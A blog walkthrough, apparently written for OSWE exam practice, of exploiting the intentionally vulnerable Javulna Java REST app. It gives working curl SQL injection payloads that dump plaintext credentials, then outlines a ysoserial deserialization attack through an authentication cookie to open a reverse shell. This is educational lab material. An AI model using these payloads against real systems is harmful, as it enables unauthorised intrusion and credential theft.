[Home](https://plackyhacker.github.io)

# Javulna Auth Bypass and RCE Walkthrough

At the time of writing I am currently studying OSWE and I decided to do a bit of Java [MVC](https://www.tutorialspoint.com/mvc_framework/mvc_framework_introduction.htm) exploitation as part of my studies. The OSWE exam requires the candidate to bypass authentication and gain reverse shell in a single exploit script, so that's what I decided to do using the [Javulna](https://github.com/defdeveu/code.java.Javulna) vulnerable web app.

The OSWE is a source code review exam so I will use the Java code to find the vulnerabilities and exploit them.

The Javulna application is a [REST API](https://aws.amazon.com/what-is/restful-api/) web application; this means there is no website front end.

## A Note on the OSWE Exam

The OSWE exam is going to be harder than exploiting the Javulna application. The Advanced Web Attacks and Exploitation course gives you all of the knowledge you need to exploit the exam targets. This is about developing my own methodology.

## My Methodology

I have developed my own method for exploiting web applications when the objectives are to bypass authentication then gain remote code execution; because this is what is expected in the exam. If the objective was to test for as many vulnerabilities as possible in the application then this methodology would need to be adjusted somewhat.

### Mapping out the web application

The first thing I do is to spend a bit of time mapping out the web application's endpoints; the URIs that I can interact with as a user. Because I have access to the source code and I know that it is an MVC application finding the endpoints is quite easy (but can be time consuming). Essentially we are looking for classes that use the `@RestController` annotation, and the functions within the class that use the `@RequestMapping`, `@PostMapping`, `@PutMapping`, `@GetMapping` etc.


```java
@RestController()
public class MovieController {
    // ...
    
    @GetMapping("rest/movie")
    public @ResponseBody List<MovieDto> findMovies(
    // ...
```



Javulna has a simple `MovieController` class, which contains an endpoint mapping for a GET request to the `rest/movie` URI. This can be used to demonstrate:


```
curl 10.10.0.120:8080/rest/movie

[{"id":"1","title":"Star Wars - A new hope","description":"Luke Skywalker joins forces with a Jedi Knight, a cocky pilot, a Wookiee, and two droids to save the galaxy from the Empires world-destroying battle-station, while also attempting to rescue Princess Leia from the evil Darth Vader.","genre":" Action, Adventure, Fantasy"},{"id":"2","title":"Star Wars - The Empire Strikes Back","description":"After the rebels are overpowered by the Empire on their newly established base, Luke Skywalker begins Jedi training with Master Yoda. His friends accept shelter from a questionable ally as Darth Vader hunts them in a plan to capture Luke.","genre":" Action, Adventure, Fantasy"},{"id":"3","title":"Star Wars - Return of the Jedi","description":"After a daring mission to rescue Han Solo from Jabba the Hutt, the rebels dispatch to Endor to destroy a more powerful Death Star. Meanwhile, Luke struggles to help Vader back from the dark side without falling into the Emperors trap.","genre":" Action, Adventure, Fantasy"}] 
```


Using Visual Studio Code we can find all of the `@RestController` classes:


<img width="1591" alt="Screenshot 2022-08-09 at 07 53 30" src="https://user-images.githubusercontent.com/42491100/183583758-26e4cb8b-7803-41fb-bc3c-d867c6cb72b0.png">


The search results can be taken and a diagram of the web application endpoints can be made:


<img width="1199" alt="Screenshot 2022-08-09 at 09 25 14" src="https://user-images.githubusercontent.com/42491100/183601462-c3558817-5c8d-4ca7-95e2-8c74e7127781.png">


Notice that there is no REST endpoint for logging in to the application, which is our first objective. I'll come back to that later.

After taking a note of all the endpoints I map out the code flow, this helps to find vulnerable code, but it can also be quite time consuming. If the application is very large I might focus on endpoints that are related to authentication, sessions, password resets (stuff that might give me authentication bypass). As Javulna isn't that large I map each flow out like so:


<img width="772" alt="Screenshot 2022-08-09 at 09 30 59" src="https://user-images.githubusercontent.com/42491100/183602812-4f0ca8b1-aae9-4eb9-962e-94002d8cd4bd.png">

I also do a quick manual walk over the website, recording all of the requests, in BurpSuit. In this case there is no website so I would only use BurpSuite to examine specific requests, headers and cookies.

### Data Storage

It is important to understand how the data is stored by the web app; the database engine being used and the tables that store the data. There may be ways that you can execute code or file upload via a SQL injection (for example in MS SQL and PostgreSQL), and if there is a SQL injection vulnerability it is much easier if you understand the database schema.

Javulna uses the built in [HSQL](http://www.hsqldb.org) database so it has no remote code execution functionality in it. We know it uses HSQL because of the `application.properties` entry:

```
spring.jpa.properties.hibernate.dialect=org.hibernate.dialect.HSQLDialect
```

Included in the application is a `data.sql` file which gives us details of the database schema and the default data inserted into the tables:


<img width="905" alt="Screenshot 2022-08-09 at 11 39 34" src="https://user-images.githubusercontent.com/42491100/183628665-3ccb2cca-e5d8-4b05-94a5-16c8f905fcfd.png">

Notice that the user accounts are stored in a table called `appuser`.

**Note**: never rely upon the data in this table when targetting a live instance of the application, this is default data and is very likely to have been removed (especially in an OSWE exam scenario ;-)).

### Looking for Vulnerabilities

My methodology is a combination of white-box and grey-box testing. I generally read through code and try to spot obvious vulnerabilities, if I find something I test it with Burp Suite to see if I can inject malicious user input.

When the application is quite large, I will also use regular expressions to look for common vulnerabilities. For example:

| Language | Regex | Vulnerability |
| -------- | ----- | ------------- |
| PHP | &#92;$.&#42;( ==&#124;== )( &#92;$&#124;&#92;$).&#42; | Type juggling vulnerabilities |
| N/A | .&#42;select.&#42; | SQL injection vulnerabilities |

Visual Studio Code is quite good for searching using regular expressions.

Eyes down for a full house... on to the exploitation!

## SQL Injection Vulnerability Revealing User Credentials

During white-box source code review I found the following code:

```java
public List<MovieDto> findMovie(String title, String description, String genre, String id) {
  int conditions = 0;
  StringBuilder sql = new StringBuilder("select description, title, genre, id from movie ");
  if (StringUtils.hasText(title)) {
    appendCondition(sql, conditions);
    conditions++;
    sql.append("title LIKE '%").append(title).append("%'");
  }
...
```

We control the `title` variable/input. The `sql` string is concatinated so it is very likely that this code contains a SQL injection vulnerability. We already discovered that the `rest/movie` endpoint leads to this code (using a GET request).

We can send a GET request to test the SQL injection theory (grey-box testing):

```
curl "http://10.10.0.120:8080/rest/movie?title=Star%';--"
```

Notice in the result we still get a valid response even after we have injected SQL syntax (`%';--`):

```
[{"id":"1","title":"Star Wars - A new hope","description":"Luke Skywalker joins forces with a Jedi Knight, a cocky pilot, a Wookiee, and two droids to save the galaxy from the Empires world-destroying battle-station, while also attempting to rescue Princess Leia from the evil Darth Vader.","genre":" Action, Adventure, Fantasy"},{"id":"2","title":"Star Wars - The Empire Strikes Back","description":"After the rebels are overpowered by the Empire on their newly established base, Luke Skywalker begins Jedi training with Master Yoda. His friends accept shelter from a questionable ally as Darth Vader hunts them in a plan to capture Luke.","genre":" Action, Adventure, Fantasy"},{"id":"3","title":"Star Wars - Return of the Jedi","description":"After a daring mission to rescue Han Solo from Jabba the Hutt, the rebels dispatch to Endor to destroy a more powerful Death Star. Meanwhile, Luke struggles to help Vader back from the dark side without falling into the Emperors trap.","genre":" Action, Adventure, Fantasy"}]
```

Notice that each `json` element returned looks like this:

```json
{
    "id":"",
    "title":"",
    "description":"",
    "genre":""}
```

We now know five things:

- There's a SQLi vulnerability.
- We can inject using the `title` parameter.
- We can use a `UNION` statement to fill the four values in the `json` elements.
- We know the user table where the credentials are stored.
- The credentials are stored in plain text!

Given this information we can use the following manual exploit to get a valid account to log in with:

```
curl "http://10.10.0.120:8080/rest/movie?title='+UNION+SELECT+password,'',name,id+FROM+appuser;--"
```

The output shows the results (
some data omitted for brevity):

```json
[
    {"id":"2","title":"","description":"IamYourFather","genre":"Darth Vader"},
    {"id":"3","title":"","description":"IwishIhaveChoosenTheWookieInstead","genre":"Princess Leia"},
    {"id":"1","title":"","description":"NoSecretsATrueJediHas","genre":"Yoda"}
]
```

We can use any of these accounts to log in to the web application. We could do some brute forcing to find the login API but most web applications would document this anyway. Within Javulna this is at `/login`:

```
curl "http://10.10.0.120:8080/login" -X POST -d "username=Yoda&password=NoSecretsATrueJediHas"
```

## Java Deserialization Vulnerability Leading to RCE

At this point we have access to all of the endpoints. During black-box testing I noticed that there is an authentication cookie set afetr login:

```
curl -D - "http://10.10.0.120:8080/login" -X POST -d "username=Yoda&password=NoSecretsATrueJediHas"

HTTP/1.1 200 
...
Set-Cookie: USER_AUTHENTICATION_EXTRA_SECURITY=rO0ABXNyAB5jb20ua2FsYXZpdC5qYXZ1bG5hLm1vZGVsLlVzZXJtUBnAtT2LlQIABkwADGVtYWlsQWRkcmVzc3QAEkxqYXZhL2xhbmcvU3RyaW5nO0wABW1vdHRvcQB+AAFMAARuYW1lcQB+AAFMAAhwYXNzd29yZHEAfgABTAADc2V4cQB+AAFMAAp3ZWJQYWdlVXJscQB+AAF4cgAkY29tLmthbGF2aXQuamF2dWxuYS5tb2RlbC5CYXNlRW50aXR5QO/pccfE7scCAANMAAljcmVhdGVkQXR0ABBMamF2YS91dGlsL0RhdGU7TAACaWRxAH4AAUwADWxhc3RVcGRhdGVkQXRxAH4AA3hwcHQAATFwdAASeW9kYUBsdWNhc2FydHMuY29tdAAaSSBkb24ndCBrbm93IGhvdyBvbGQgSSBhbS50AARZb2RhdAAVTm9TZWNyZXRzQVRydWVKZWRpSGFzdAABbXQAJWh0dHA6Ly93d3cuc3RhcndhcnMuY29tL2RhdGFiYW5rL3lvZGE=; Max-Age=2147483647; Expires=Sun, 27-Aug-2090 18:10:56 GMT
...
```

Also notice that the `USER_AUTHENTICATION_EXTRA_SECURITY` cookie begins with a familiar signature: `rO0`; this means that the cookie is serialized and that there may be a deserialization vulnerability.

The web application uses a [Filter Config](https://www.javatpoint.com/filter-config) to implement the cookie deserialization which acts as an authentication cookie for the user. The code flow is as follows:

<img width="1230" alt="Screenshot 2022-08-09 at 16 18 07" src="https://user-images.githubusercontent.com/42491100/183689102-1fe961c4-ddd4-4b05-b96d-783d527b5e1a.png">

Deserializing unsanitized objects is [dangerous](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data) and should be avoided. Looking at the project in Eclispse we can also see that the application has a dependency on `CommonsCollections` version `4-4.0`:

<img width="444" alt="Screenshot 2022-08-09 at 16 20 28" src="https://user-images.githubusercontent.com/42491100/183689589-c7531b67-76bc-44cd-8743-446fd0ddbb0c.png">

We are now set up to attempt to exploit this vulnerability!

## Steps to Compromise

The steps to compromise the web application are as follows:

- Carry out the SQL Injection vulnerability to revael the user credentials.
- Log in to the web application.
- Generate a reverse shell payload for use with `ysoserial`.
- Generate a Java Deserialization exploit, using the `CommonsCollections4` payload in `ysoserial` (reverse shell).
- Adjust the `USER_AUTHENTICATION_EXTRA_SECURITY` cookie to contain the `ysoserial` payload.
- Start a local `netcat` listener.
- Send the malicious cookie to any authenticated endpoint.

## Full Exploit Code

I have posted the [full exploit code here](https://github.com/plackyhacker/plackyhacker.github.io/blob/master/code/javulna-exploit.py). I have tried to comment the code as much as possible so it makes sense.

## Finally

There is loads of vulnerabilities in the Javulna application, there might even be other ways to get remote code execution. There is also a [Udemy Course](https://www.udemy.com/course/backend-development-security-fundamentals/) if you want to learn more about exploiting Java web applications. The course uses [Postman](https://www.postman.com) to demonstrate exploitation, so don't expect any `python` exploit code.

[Home](https://plackyhacker.github.io)
